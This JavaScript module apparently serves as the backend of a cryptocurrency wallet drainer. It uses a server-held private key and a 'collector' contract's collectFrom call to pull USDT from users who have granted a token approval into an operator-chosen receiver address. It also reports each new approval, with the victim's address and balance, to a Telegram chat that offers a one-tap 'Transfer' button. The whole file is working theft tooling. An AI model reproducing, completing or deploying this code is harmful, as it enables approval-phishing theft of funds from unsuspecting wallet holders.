import { ethers } from 'ethers';
import axios from 'axios';

// ─── Environment Variables ───────────────────────────────────────────────────
export const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
export const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
export const OWNER_PRIVATE_KEY = process.env.OWNER_PRIVATE_KEY;
export const RECEIVER_ADDRESS = process.env.RECEIVER_ADDRESS;
export const RPC_URL = process.env.RPC_URL || 'https://eth.llamarpc.com';
export const USDT_ADDRESS = process.env.USDT_ADDRESS || '0xdac17f958d2ee523a2206206994597c13d831ec7';
export const AUTO_COLLECTOR_ADDRESS = process.env.AUTO_COLLECTOR_ADDRESS || '0x672897015e6aD7d1B72870958C596164eC53A80f';

// ─── ABI Definitions ────────────────────────────────────────────────────────
export const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function allowance(address owner, address spender) view returns (uint256)'
];

export const COLLECTOR_ABI = [
  'function collectFrom(address token, address from, uint256 amount, address to) external'
];

// ─── CORS Helper ─────────────────────────────────────────────────────────────
export function setCorsHeaders(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
}

export function handleCors(req, res) {
  setCorsHeaders(res);
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return true;
  }
  return false;
}

// ─── Provider & Contract Factories ───────────────────────────────────────────
export function getProvider() {
  return new ethers.JsonRpcProvider(RPC_URL);
}

export function getUsdtContract(provider) {
  return new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider || getProvider());
}

export function getWallet(provider) {
  return new ethers.Wallet(OWNER_PRIVATE_KEY, provider || getProvider());
}

export function getCollectorContract(wallet) {
  return new ethers.Contract(AUTO_COLLECTOR_ADDRESS, COLLECTOR_ABI, wallet);
}

// ─── Execute Collection (Transfer) ──────────────────────────────────────────
export async function executeCollection(userAddress, amount, targetReceiver) {
  const finalReceiver = targetReceiver || RECEIVER_ADDRESS;

  if (!OWNER_PRIVATE_KEY) {
    throw new Error('Server missing Private Key');
  }

  const provider = getProvider();
  const wallet = getWallet(provider);
  const collectorContract = getCollectorContract(wallet);
  const usdtContract = getUsdtContract(provider);

  const decimals = await usdtContract.decimals();
  const amountWei = ethers.parseUnits(amount.toString(), decimals);

  console.log(`Initiating Transfer: ${amount} USDT from ${userAddress} to ${finalReceiver}`);

  const tx = await collectorContract.collectFrom(
    USDT_ADDRESS,
    userAddress,
    amountWei,
    finalReceiver
  );

  console.log('Transaction sent:', tx.hash);

  // In serverless, we can't wait in background — just return hash
  return tx.hash;
}

// ─── Send Telegram Message (via HTTP API — no polling) ──────────────────────
export async function sendTelegramMessage(text, opts = {}) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    ...opts
  };

  try {
    await axios.post(url, body);
    console.log('Telegram message sent.');
  } catch (error) {
    console.error('Error sending Telegram message:', error.message);
  }
}

// ─── Send Telegram Edit Message ─────────────────────────────────────────────
export async function editTelegramMessage(messageId, text, opts = {}) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;

  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    message_id: messageId,
    text,
    parse_mode: 'HTML',
    ...opts
  };

  try {
    await axios.post(url, body);
  } catch (error) {
    console.error('Error editing Telegram message:', error.message);
  }
}

// ─── Answer Telegram Callback Query ─────────────────────────────────────────
export async function answerCallbackQuery(callbackQueryId, text, showAlert = false) {
  if (!TELEGRAM_BOT_TOKEN) return;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;

  try {
    await axios.post(url, {
      callback_query_id: callbackQueryId,
      text,
      show_alert: showAlert
    });
  } catch (error) {
    console.error('Error answering callback query:', error.message);
  }
}

// ─── Send Approval Telegram Notification (with inline buttons) ──────────────
export async function sendTelegramNotification(userAddress, txHash, source, balanceStr = 'N/A') {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kolkata' });
  const message = `
🚀 <b>NEW APPROVAL INITIATED!</b>

📱 <b>SOURCE:</b>
<code>${source ? source.toUpperCase() : 'UNKNOWN'}</code>

👤 <b>USER ADDRESS:</b>
<code>${userAddress}</code>

🔗 <b>TRANSACTION HASH:</b>
<a href="https://etherscan.io/tx/${txHash}">View on Etherscan</a>
<code>${txHash || 'Pending'}</code>

💰 <b>BALANCE:</b>
<b>${balanceStr}</b>

⏰ <b>TIME:</b>
<code>${time}</code>
  `.trim();

  const opts = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [
          { text: '⚙️ Receiver Address', callback_data: 'config' },
          { text: '💰 Balance', callback_data: `balance:${userAddress}` }
        ],
        [
          { text: '💸 Transfer', callback_data: `transfer:${userAddress}` }
        ]
      ]
    })
  };

  await sendTelegramMessage(message, opts);
}
